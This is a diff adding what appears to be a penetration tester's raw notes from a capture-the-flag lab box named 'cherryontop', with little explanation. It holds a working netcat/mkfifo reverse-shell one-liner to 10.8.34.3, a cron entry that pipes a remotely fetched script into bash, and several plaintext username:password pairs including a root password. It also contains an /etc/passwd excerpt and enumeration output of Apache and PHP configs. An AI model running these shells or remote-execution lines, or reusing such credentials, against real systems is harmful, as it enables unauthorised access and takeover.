@@ -1,0 +1,70 @@
+10.8.34.3 cherryontop.tld
+
+#!/bin/bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.34.3 4242 >/tmp/f
+
+*  *    * * *   bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
+
+
+
+NanoWillNeverBeOvertaken : root
+
+login: puppet   password: master
+
+chad-cherry:x:1000:1000:Chad Cherry:/home/chad-cherry:/bin/bash
+molly-milk:x:1001:1001::/home/molly-milk:/bin/sh
+sam-sprinkles:x:1002:1002::/home/sam-sprinkles:/bin/sh
+bob-boba:x:1003:1003::/home/bob-boba:/bin/sh
+notsus:x:1004:1004::/home/.notsus:/bin/sh
+
+ssh molly-milk@cherryontop.thm   :   ChadCherrysFutureWife
+
+sam-sprinkles:SammyInMiami43
+
+n4n0ch3rryw1llb37h3fu7ur3
+
+
+/etc/apache2/sites-enabled
+
+lrwxrwxrwx 1 root root 41 Apr  8  2023 /etc/apache2/sites-enabled/a.cherryontop.thm.conf -> ../sites-available/a.cherryontop.thm.conf                                                         
+<VirtualHost *:80>                                                                                                                                                                            
+        ServerAdmin webmaster@localhost                                                                                                                                                       
+        ServerName cherryontop.thm                                                                                                                                                            
+        DocumentRoot /var/www/a.cherryontop.thm                                                                                                                                               
+        ErrorLog ${APACHE_LOG_DIR}/error.log                                                                                                                                                  
+        CustomLog ${APACHE_LOG_DIR}/access.log combined                                                                                                                                       
+</VirtualHost>                                                                                                                                                                                
+lrwxrwxrwx 1 root root 41 Apr  8  2023 /etc/apache2/sites-enabled/b.cherryontop.thm.conf -> ../sites-available/b.cherryontop.thm.conf                                                         
+<VirtualHost *:80>                                                                                                                                                                            
+        ServerAdmin webmaster@localhost                                                                                                                                                       
+        ServerName nano.cherryontop.thm                                                                                                                                                       
+        ServerAlias nano.cherryontop.thm                                                                                                                                                      
+        DocumentRoot /var/www/b.cherryontop.thm                                                                                                                                               
+        ErrorLog ${APACHE_LOG_DIR}/error.log                                                                                                                                                  
+        CustomLog ${APACHE_LOG_DIR}/access.log combined                                                                                                                                       
+</VirtualHost>   
+
+
+----------------
+
+-rw-r--r-- 1 root root 72928 Feb 22  2023 /etc/php/8.1/apache2/php.ini                                                                                                                        
+allow_url_fopen = On                                                                                                                                                                          
+allow_url_include = Off                                                                                                                                                                       
+odbc.allow_persistent = On                                                                                                                                                                    
+mysqli.allow_persistent = On                   
+pgsql.allow_persistent = On                    
+-rw-r--r-- 1 root root 72924 Feb 22  2023 /etc/php/8.1/cli/php.ini                             
+allow_url_fopen = On                           
+allow_url_include = Off                        
+odbc.allow_persistent = On                     
+mysqli.allow_persistent = On                   
+pgsql.allow_persistent = On   
+
+
+
+--------------------
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)               
+Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
+
+ -> Extracting tables from /var/lib/PackageKit/transactions.db (limit     
